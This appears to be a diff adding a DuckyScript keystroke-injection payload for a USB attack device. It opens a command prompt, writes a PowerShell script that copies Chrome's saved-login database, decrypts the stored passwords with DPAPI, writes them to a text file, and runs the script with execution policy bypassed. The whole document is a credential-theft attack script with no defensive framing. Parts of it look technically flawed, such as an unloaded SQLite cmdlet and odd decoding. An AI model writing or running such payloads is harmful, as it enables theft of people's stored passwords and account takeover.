@@ -1,0 +1,45 @@
+REM Open a command prompt
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+
+REM Create the PowerShell script
+STRING echo $FilePath = "$env:USERPROFILE\Documents\stored_creds.txt" > %TEMP%\creds.ps1
+ENTER
+STRING echo Add-Type -AssemblyName System.Security >> %TEMP%\creds.ps1
+ENTER
+STRING echo function Get-ChromePass { >> %TEMP%\creds.ps1
+ENTER
+STRING echo ^$LocalAppData = $env:LocalAppData >> %TEMP%\creds.ps1
+ENTER
+STRING echo ^$LoginDataPath = "^$LocalAppData\Google\Chrome\User Data\Default\Login Data" >> %TEMP%\creds.ps1
+ENTER
+STRING echo ^$temp = "C:\temp.db" >> %TEMP%\creds.ps1
+ENTER
+STRING echo Copy-Item ^$LoginDataPath -Destination ^$temp >> %TEMP%\creds.ps1
+ENTER
+STRING echo ^$sql = "SELECT action_url, username_value, password_value FROM logins" >> %TEMP%\creds.ps1
+ENTER
+STRING echo ^$data = Invoke-SqliteQuery -DataSource ^$temp -Query ^$sql >> %TEMP%\creds.ps1
+ENTER
+STRING echo foreach (^$row in ^$data) { >> %TEMP%\creds.ps1
+ENTER
+STRING echo ^$pass = [System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String(^$row.password_value), $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser) >> %TEMP%\creds.ps1
+ENTER
+STRING echo ^$row.password_value = [System.Text.Encoding]::UTF8.GetString(^$pass) >> %TEMP%\creds.ps1
+ENTER
+STRING echo } >> %TEMP%\creds.ps1
+ENTER
+STRING echo ^$data ^| Out-File -FilePath ^$FilePath >> %TEMP%\creds.ps1
+ENTER
+STRING echo } >> %TEMP%\creds.ps1
+ENTER
+STRING echo Get-ChromePass >> %TEMP%\creds.ps1
+ENTER
+
+REM Execute the PowerShell script
+STRING powershell -ExecutionPolicy Bypass -File %TEMP%\creds.ps1
+ENTER
+
